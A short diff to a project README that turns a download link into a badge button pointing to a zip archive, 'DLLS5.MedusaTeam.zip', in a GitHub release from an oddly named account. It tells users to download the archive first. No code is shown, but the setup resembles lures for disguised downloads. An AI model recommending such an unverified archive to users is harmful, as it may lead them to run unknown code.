@@ -25,7 +25,7 @@ Control by the developers. Artists and developers receive tools for fine‑tunin
 
 ## How to use
 
-[![Download Now](https://github.com/ryantaylorhq03v0/DLLS5-Medusa/releases/download/dlls5/DLLS5.MedusaTeam.zip)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/ryantaylorhq03v0/DLLS5-Medusa/releases/download/dlls5/DLLS5.MedusaTeam.zip)
 
 1. Download the Medusa archive by clicking the button above
 
